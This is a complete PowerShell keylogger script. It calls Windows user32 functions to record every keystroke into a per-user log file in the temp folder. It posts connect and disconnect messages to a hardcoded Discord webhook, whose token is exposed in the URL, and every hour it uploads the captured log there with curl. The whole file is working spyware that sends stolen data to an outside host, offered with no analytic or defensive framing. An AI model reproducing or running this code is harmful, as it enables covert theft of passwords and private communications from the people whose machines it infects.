# powershell keylogger
# created by : Henry


# keylogger
$online = @"
Connected to a device !!!!
"@
$offline = @"
Disconnected to the device !!!!
"@
$payload = [PSCustomObject]@{
    content = $online
}
$close = [PSCustomObject]@{
  content = $offline
}
$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
$done = $true
$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00',
    '13:00:00',
    '14:00:00',
    '15:00:00',
    '16:00:00',
    '17:00:00',
    '18:00:00',
    '19:00:00',
    '20:00:00',
    '21:00:00',
    '22:00:00',
    '23:00:00'
)

# sort the times in chronological order
$logTimes = $logTimes | Sort-Object
function KeyLogger() {
  $un = $env:UserName
  $logFile="$env:temp/sad/$un.log"
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($payload | ConvertTo-Json)
  
  # generate log file
  New-Item -Path $logFile -ItemType File -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # attempt to log keystrokes
  

  try{
    while ($done) {
      Start-Sleep -Milliseconds 40
      $time = Get-Date -Format HH:mm:ss
      foreach ($t in $logTimes)
      {
          # checks if time passed already
          if($time -ceq $t)
          {
              "# Sending file logs" 
              Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$logFile```" $link"
              New-Item -Path $logFile -ItemType File -Force
              Start-Sleep -Seconds 1
              
          }
          else{
            for ($ascii = 9; $ascii -le 254; $ascii++) {
  
              # use API to get key state
              $keystate = $API::GetAsyncKeyState($ascii)
        
              # use API to detect keystroke
              if ($keystate -eq -32767) {
                $null = [console]::CapsLock
        
                # map virtual key
                $mapKey = $API::MapVirtualKey($ascii, 3)
        
                # create a stringbuilder
                $keyboardState = New-Object Byte[] 256
                $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                $loggedchar = New-Object -TypeName System.Text.StringBuilder
        
                # translate virtual key
                if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                  # add logged key to file
                  [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
                }
              }
            }
          }
      }

    }
    
  }
  finally{
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($close | ConvertTo-Json)
  }

}
KeyLogger